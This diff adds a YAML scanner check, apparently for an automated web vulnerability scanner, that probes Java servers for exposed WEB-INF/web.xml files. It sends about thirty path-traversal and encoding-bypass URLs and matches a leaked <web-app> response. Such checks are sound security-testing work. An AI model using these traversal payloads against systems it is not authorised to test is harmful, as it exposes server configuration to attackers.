@@ -1,0 +1,111 @@
+# you have to add URI_.* insertion point to your policy
+send:
+  - method: 'GET'
+    url: "/WEB-INF/web.xml"
+
+  - method: 'GET'
+    url: "/web-inf/web.xml"
+
+  - method: 'GET'
+    url: "/WEB-INF./web.xml"
+
+  - method: 'GET'
+    url: "/../WEB-INF/web.xml"
+
+  - method: 'GET'
+    url: "/../../WEB-INF/web.xml"
+
+  - method: 'GET'
+    url: "/../../../WEB-INF/web.xml"
+
+  - method: 'GET'
+    url: "/../../../../WEB-INF/web.xml"
+
+  - method: 'GET'
+    url: "/demo/../WEB-INF/web.xml"
+
+  - method: 'GET'
+    url: "/wiki/struts/..%252f..%252f/WEB-INF/web.xml"
+
+  - method: 'GET'
+    url: "/wiki/struts/..%252f..%252f..%252f/WEB-INF/web.xml"
+
+  - method: 'GET'
+    url: "/..;/WEB-INF/web.xml"
+
+  - method: 'GET'
+    url: "/..;/..;/WEB-INF/web.xml"
+
+  - method: 'GET'
+    url: "/..%3B/WEB-INF/web.xml"
+
+  - method: 'GET'
+    url: "/..%253B/WEB-INF/web.xml"
+
+  - method: 'GET'
+    url: "/plugins//../WEB-INF/web.xml%C0%80.jsp"
+
+  - method: 'GET'
+    url: "/js/app//../WEB-INF/web.xml%C0%80.jsp"
+
+  - method: 'GET'
+    url: "/js/app//../WEB-INF/web.xml"
+
+  - method: 'GET'
+    url: "/js/app//../../WEB-INF/web.xml"
+
+  - method: 'GET'
+    url: "/ctxroot/%C0%AE/WEB-INF/web.xml"
+
+  - method: 'GET'
+    url: "/contextpath/%c0%ae%c0%ae/WEB-INF/web.xml"
+
+  - method: 'GET'
+    url: "/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/WEB-INF/web.xml"
+
+  - method: 'GET'
+    url: "/js/app/../../WEB-INF/web.xml%3bx%3d/"
+
+  - method: 'GET'
+    url: "/js/app/1//../../WEB-INF/web.xml%C0%80.jsp"
+
+  - method: 'GET'
+    url: "/%c0%ae/WEB-INF/web.xml"
+
+  - method: 'GET'
+    url: "/%25c0%25ae/%25c0%25ae/WEB-INF/web.xml"
+
+  - method: 'GET'
+    url: "/%25c0%25ae/%25c0%25ae/%25c0%25ae/WEB-INF/web.xml"
+
+  - method: 'GET'
+    url: "/%25c0%25ae/%25c0%25ae/%25c0%25ae/%25c0%25ae/WEB-INF/web.xml"
+
+  - method: 'GET'
+    url: "/WEB-INF/web.xml;x="
+
+  - method: 'GET'
+    url: "/../WEB-INF/web.xml;x="
+
+  - method: 'GET'
+    url: "/../../WEB-INF/web.xml;x="
+
+  - method: 'GET'
+    url: "/../../../WEB-INF/web.xml;x="
+
+detect:
+  - response:
+    - body: '<web-app[\w\W]+<\/web-app>'
+
+meta-info:
+  - title: "Java web.xml information leakage vulnerability"
+  - description: "WEB-INF directory may be accessed by external users because of improper configuration, resulting in the leakage of configuration information."
+  - type: info
+  - threat: 20
+  - tags:
+    - Information Exposure
+    - Java
+    - web-inf
+    - tomcat
+    - JBoss
+    - J2EE
